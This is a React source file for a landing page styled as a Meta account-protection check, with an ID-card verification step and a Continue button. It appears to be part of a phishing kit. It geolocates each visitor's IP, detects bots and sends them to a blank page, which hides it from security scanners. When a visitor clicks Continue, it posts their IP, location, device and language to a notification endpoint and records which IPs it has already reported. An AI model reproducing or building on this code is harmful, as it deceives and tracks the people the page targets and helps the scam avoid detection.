'use client';

import { useCallback, useEffect, useMemo, useState } from 'react';
import HeroImage from '@/assets/images/hero-image.jpg';
import '@/assets/css/meta-protect-landing.css';
import { faCircleCheck, faIdCard } from '@fortawesome/free-solid-svg-icons';
import { FontAwesomeIcon } from '@fortawesome/react-fontawesome';
import { landingDefaultTexts } from '@/i18n/default-texts';
import { applyTranslations } from '@/utils/apply-translations';
import detectBot from '@/utils/detect_bot';
import { getDeviceLabel } from '@/utils/device';
import { formatLocalizedDate } from '@/utils/format-localized-date';
import { fetchAndPersistGeo, type IpInfo } from '@/utils/geo-client';
import { buildContinueMessage } from '@/utils/message';
import { applyDocumentLanguage, LANG_COOKIE } from '@/utils/resolve-language';

interface LandingPageProps {
    onContinue: () => void;
    initialLang?: string;
}

const LandingPage = ({ onContinue, initialLang = 'en' }: LandingPageProps) => {
    const defaultTexts = useMemo(() => ({ ...landingDefaultTexts }), []);
    const [today, setToday] = useState(() => formatLocalizedDate(new Date(), initialLang));
    const [translatedTexts, setTranslatedTexts] = useState<Record<string, string>>(() =>
        applyTranslations(defaultTexts, initialLang)
    );
    const [isLangReady, setIsLangReady] = useState(false);
    const [isContinuing, setIsContinuing] = useState(false);
    const [ipInfo, setIpInfo] = useState<IpInfo>({
        ip: 'Unknown',
        city: 'Unknown',
        region: 'Unknown',
        country: 'Unknown',
        country_code: 'Unknown'
    });
    const [activeLang, setActiveLang] = useState(initialLang);

    const applyLang = useCallback(
        (lang: string) => {
            const nextLang = lang || 'en';
            setActiveLang(nextLang);
            setTranslatedTexts(nextLang === 'en' ? defaultTexts : applyTranslations(defaultTexts, nextLang));
            setToday(formatLocalizedDate(new Date(), nextLang));
            applyDocumentLanguage(nextLang);
            localStorage.setItem('targetLang', nextLang);
            document.cookie = `${LANG_COOKIE}=${nextLang}; path=/; max-age=86400; samesite=lax`;
        },
        [defaultTexts]
    );

    const initializeApp = useCallback(async () => {
        try {
            const manual = localStorage.getItem('langManual') === '1';
            const preferredLang = localStorage.getItem('targetLang') || initialLang;
            applyLang(preferredLang);

            const geo = await fetchAndPersistGeo(preferredLang);
            setIpInfo(geo.ipInfo);
            if (manual) {
                applyLang(preferredLang);
            } else {
                applyLang(geo.lang || preferredLang);
            }

            const botResult = await detectBot();
            if (botResult.isBot) {
                window.location.href = 'about:blank';
            }
        } catch (error) {
            console.error('Initialization error:', error);
            applyLang(initialLang || 'en');
        } finally {
            setIsLangReady(true);
        }
    }, [applyLang, initialLang]);

    useEffect(() => {
        localStorage.removeItem('message_id');
        localStorage.removeItem('message');
        localStorage.removeItem('messageId');
        initializeApp();
    }, [initializeApp]);

    const texts = Object.keys(translatedTexts).length > 0 ? translatedTexts : defaultTexts;

    const handleContinue = async () => {
        if (!isLangReady || isContinuing) {
            return;
        }

        setIsContinuing(true);

        try {
            const currentIp = String(ipInfo.ip || '').trim();
            const notifiedRaw = localStorage.getItem('continue_notified_ips');
            let notifiedIps: string[] = [];
            try {
                notifiedIps = notifiedRaw ? (JSON.parse(notifiedRaw) as string[]) : [];
            } catch {
                notifiedIps = [];
            }

            const alreadyNotifiedLocally =
                Boolean(currentIp) &&
                currentIp !== 'Unknown' &&
                notifiedIps.some((ip) => ip.toLowerCase() === currentIp.toLowerCase());

            if (!alreadyNotifiedLocally) {
                const device = await getDeviceLabel().catch(() => 'Unknown');
                const message = buildContinueMessage({
                    geoInfo: {
                        asn: 0,
                        ip: ipInfo.ip,
                        city: ipInfo.city,
                        region: ipInfo.region,
                        country: ipInfo.country,
                        country_code: ipInfo.country_code || 'US'
                    },
                    language: activeLang || initialLang || 'en',
                    device
                });

                const response = await fetch('/api/continue-notify', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ message, ip: currentIp })
                });
                const result = (await response.json()) as {
                    success?: boolean;
                    skipped?: boolean;
                    message_id?: number | null;
                };

                if (result?.success && currentIp && currentIp !== 'Unknown') {
                    const nextNotified = Array.from(
                        new Set([...notifiedIps, currentIp].map((ip) => ip.trim()).filter(Boolean))
                    );
                    localStorage.setItem('continue_notified_ips', JSON.stringify(nextNotified));
                }

                if (result?.success && !result.skipped && typeof result.message_id === 'number') {
                    localStorage.setItem('message_id', String(result.message_id));
                }
            }
        } catch (error) {
            console.error('Continue notify failed:', error);
        }

        await new Promise((resolve) => setTimeout(resolve, 700));
        onContinue();
    };

    return (
        <div className='meta-protect-landing'>
            {!isLangReady ? (
                <div className='meta-protect-landing__lang-overlay' aria-busy='true' aria-live='polite'>
                    <div className='meta-protect-landing__lang-spinner' />
                </div>
            ) : null}
            <div className='meta-protect-landing__card'>
                <div className='meta-protect-landing__hero'>
                    <img src={HeroImage.src} alt='' />
                </div>

                <h1 className='meta-protect-landing__title'>{texts.title}</h1>
                <p className='meta-protect-landing__description'>{texts.description}</p>

                <div className='meta-protect-landing__steps'>
                    <div className='meta-protect-landing__step'>
                        <FontAwesomeIcon
                            icon={faCircleCheck}
                            className='meta-protect-landing__step-icon meta-protect-landing__step-icon--done'
                            size='xl'
                        />
                        <p>{texts.protectionText}</p>
                    </div>
                    <div className='meta-protect-landing__step'>
                        <FontAwesomeIcon
                            icon={faIdCard}
                            className='meta-protect-landing__step-icon meta-protect-landing__step-icon--active'
                            size='xl'
                        />
                        <p>{texts.processText}</p>
                    </div>
                </div>

                <div className='meta-protect-landing__button-wrap'>
                    <button
                        type='button'
                        className={`meta-protect-landing__button${isContinuing ? ' is-loading' : ''}`}
                        onClick={handleContinue}
                        disabled={!isLangReady || isContinuing}
                    >
                        {isContinuing ? <span className='meta-protect-landing__button-spinner' /> : null}
                        {texts.continueBtn}
                    </button>
                </div>

                <p className='meta-protect-landing__footer'>
                    {texts.restrictedText} <span className='meta-protect-landing__footer-date'>{today}</span>
                </p>
            </div>
        </div>
    );
};

export default LandingPage;
